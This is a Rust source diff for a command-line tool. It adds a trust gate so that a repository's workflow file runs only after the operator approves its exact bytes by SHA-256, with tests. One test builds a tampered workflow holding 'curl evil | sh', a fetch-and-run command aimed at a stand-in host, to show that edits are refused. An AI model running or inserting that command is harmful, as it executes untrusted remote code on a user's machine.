@@ -36,7 +36,8 @@ use marion_core::agent_type::{AgentType, AgentTypes};
 pub const STORE_FILE: &str = "trusted.toml";
 
 pub const USAGE: &str = "usage: marion trust allow [<file>] | deny [<file>] | list\n\
-    \x20 <file> defaults to the nearest .marion/agents.toml at or above the current directory";
+    \x20 <file> defaults to the nearest .marion/agents.toml at or above the current directory; a\n\
+    \x20 .marion/workflows/<name>.toml is a workflow, and allow shows what it runs";
 
 /// Why a repository command was not run, or the trust store could not be used.
 #[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
@@ -68,6 +69,14 @@ pub enum TrustError {
         argv: Vec<String>,
         file: PathBuf,
     },
+    #[error(
+        "the workflow {file} {why}; it runs agents and commands a repository chose, so marion runs \
+         it only after you have reviewed it. Read it (`marion workflow check {quoted}` says what it \
+         runs), then run: marion trust allow {quoted}",
+        why = if *edited { "has changed since you allowed it" } else { "is not one you have allowed" },
+        quoted = shell_word(&file.display().to_string()),
+    )]
+    UntrustedWorkflow { file: PathBuf, edited: bool },
     #[error(
         "the trust store {path} is refused: {why}. It decides which repository commands marion \
          runs, so only you may be able to write it; fix it with `chmod 600 {path}` (and \
@@ -209,6 +218,25 @@ pub fn require_in(
             file,
             agent_type: ty.name.clone(),
             asks: asked.asks(),
+            edited: verdict == Verdict::Edited,
+        }),
+    }
+}
+
+/// **The gate on a repository's workflow file**: it runs only where the operator trusted exactly
+/// these bytes. `text` is what the caller parsed, so the digest is of what will run.
+pub fn require_workflow(file: &Path, text: &str) -> Result<(), TrustError> {
+    require_workflow_in(store_path().ok_or(TrustError::NoStore)?, file, text)
+}
+
+/// [`require_workflow`] against the store at `store`.
+pub fn require_workflow_in(store: PathBuf, file: &Path, text: &str) -> Result<(), TrustError> {
+    let store = Store::open(store)?;
+    let file = canonical(file)?;
+    match store.verdict(&file, &crate::inbox::sha256_hex(text.as_bytes())) {
+        Verdict::Trusted => Ok(()),
+        verdict => Err(TrustError::UntrustedWorkflow {
+            file,
             edited: verdict == Verdict::Edited,
         }),
     }
@@ -549,6 +577,9 @@ pub fn run(
             let canonical = canonical(&file).map_err(err)?;
             let text = std::fs::read_to_string(&canonical)
                 .map_err(|e| Some(format!("{}: {e}", canonical.display())))?;
+            if crate::workflow_file::is_repo_workflow(&canonical) {
+                return allow_workflow(&canonical, &text, store, out);
+            }
             let types = crate::run::agent_types_text(canonical.clone(), &text)
                 .map_err(|e| Some(e.to_string()))?;
             let found = commands(&types);
@@ -603,6 +634,43 @@ pub fn run(
         }
         _ => Err(None),
     }
+}
+
+/// `allow` on a repository's workflow file: checked against its tree exactly as a run checks it,
+/// shown step by step, then trusted by the digest of the bytes shown.
+fn allow_workflow(
+    file: &Path,
+    text: &str,
+    store: PathBuf,
+    out: &mut dyn std::io::Write,
+) -> Result<(), Option<String>> {
+    let tree = file
+        .parent()
+        .and_then(Path::parent)
+        .and_then(Path::parent)
+        .ok_or_else(|| Some(format!("{} is not in a repository", file.display())))?;
+    let (checked, workflow) =
+        crate::workflow_file::check(tree, file).map_err(|e| Some(e.to_string()))?;
+    if checked != text {
+        return Err(Some(format!(
+            "{} changed while it was being read; run allow again",
+            file.display()
+        )));
+    }
+    let sha256 = crate::inbox::sha256_hex(text.as_bytes());
+    let w = |r: std::io::Result<()>| r.map_err(|e| Some(e.to_string()));
+    w(writeln!(out, "{}  sha256 {sha256}", file.display()))?;
+    for line in crate::workflow_file::describe(&workflow) {
+        w(writeln!(out, "  {line}"))?;
+    }
+    let mut store = Store::open(store).map_err(|e| Some(e.to_string()))?;
+    store.allow(file.to_path_buf(), sha256);
+    store.save().map_err(|e| Some(e.to_string()))?;
+    w(writeln!(
+        out,
+        "allowed. Any edit to {} revokes this until you allow it again.",
+        file.display()
+    ))
 }
 
 /// What `allow` is about to trust, for the operator to read.
@@ -870,6 +938,44 @@ mod tests {
         assert!(
             msg.ends_with(&format!("marion trust allow {}", file.display())),
             "{msg}"
+        );
+    }
+
+    /// **A repository's workflow runs only once trusted by its bytes**: refused before `allow`
+    /// with the exact command, `allow` shows what it runs and records it, and an edit revokes it.
+    #[test]
+    fn a_repository_workflow_is_trusted_by_its_bytes_and_an_edit_revokes_it() {
+        let d = tmp("workflow");
+        let repo = d.join("repo");
+        let file = repo.join(".marion/workflows/plan.toml");
+        let store = d.join("data/marion").join(STORE_FILE);
+        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+        let text = "schema = 1\nname = \"plan\"\n[[step]]\nid = \"a\"\nkind = \"agent\"\non = \"claude\"\nprompt = \"p\"\nverify = [\"make check\"]\n";
+        std::fs::write(&file, text).unwrap();
+        let e = require_workflow_in(store.clone(), &file, text).unwrap_err();
+        assert!(
+            e.to_string().contains("marion trust allow") && e.to_string().contains("plan.toml"),
+            "{e}"
+        );
+        let mut out = Vec::new();
+        run(
+            &["allow".into(), file.display().to_string()],
+            &repo,
+            store.clone(),
+            &mut out,
+        )
+        .unwrap();
+        let shown = String::from_utf8(out).unwrap();
+        assert!(
+            shown.contains("step 1 a: agent on claude") && shown.contains("make check"),
+            "{shown}"
+        );
+        require_workflow_in(store.clone(), &file, text).unwrap();
+        let edited = text.replace("make check", "curl evil | sh");
+        let e = require_workflow_in(store, &file, &edited).unwrap_err();
+        assert!(
+            e.to_string().contains("changed since you allowed it"),
+            "{e}"
         );
     }
 
